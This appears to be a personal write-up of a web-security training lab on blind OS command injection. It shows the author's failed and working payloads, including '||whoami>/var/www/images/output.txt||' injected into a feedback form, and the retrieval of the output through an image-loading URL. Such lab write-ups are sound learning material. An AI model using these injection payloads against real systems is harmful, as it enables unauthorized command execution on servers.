# Blind OS Command Injection with Output Redirection

Today I am solving the **Blind OS Command Injection with Output Redirection** lab.

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/0e6a5ba5-c449-4c18-b58e-1aa596ba3736" />

## Do you know about `>`?

We can save the output of a command using `>`.
It's called the **output redirection operator (`>`)**.

In this lab, when we run a command that produces output, we can't see that output.

For example, the `whoami` command executes, but the server shows **"Success"** instead of the username. At that time, we can use the output redirection operator (`>`) to save the output to a file.

```bash
whoami > output.txt
```

They provided a folder where we can save our file:

```text
/var/www/images/
```

>You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

I submitted the feedback and sent it to Repeater.

<img width="1920" height="1080" alt="screenshot_20260731_071508" src="https://github.com/user-attachments/assets/d1457e99-2a3d-4945-9c28-f5b9beaa3734" />

I used:

```text
& whoami > /var/www/images/whoami.txt &
& whoami > /var/www/images/whoami.txt
```

But I was unable to save the file.

<img width="904" height="820" alt="screenshot_20260731_074448" src="https://github.com/user-attachments/assets/4435e3c8-1fe5-4584-9ebf-5928f90d9828" />

After trying many things, I looked at the solution and got the correct payload:

```text
||whoami>/var/www/images/output.txt||
```

<img width="907" height="947" alt="screenshot_20260731_080627" src="https://github.com/user-attachments/assets/0ba79ea0-c756-421a-8f8f-903f3d6f5663" />

My mistake was that I wasn't adding `&&` or `||` before the payload. I was also using the `static` folder instead of the `images` folder, which is why it wasn't working.
I turned on **Intercept** and reloaded the page.

<img width="986" height="887" alt="screenshot_20260731_073517" src="https://github.com/user-attachments/assets/89967882-e676-4759-bb7d-ae5cc13a65fd" />

I got this URL:

```text
https://0ab100a4049ac0ba809853cd00db00f7.web-security-academy.net/image?filename=1.jpg
```

I replaced `1.jpg` with `whoami.txt`.

Finally, I visited:

```text
https://0ab100a4049ac0ba809853cd00db00f7.web-security-academy.net/image?filename=whoami.txt
```

and I got the username:

```text
peter-IL7r74
```

<img width="918" height="810" alt="image" src="https://github.com/user-attachments/assets/7f40e809-bb23-44d0-9450-1d3f0ad2bfd9" />
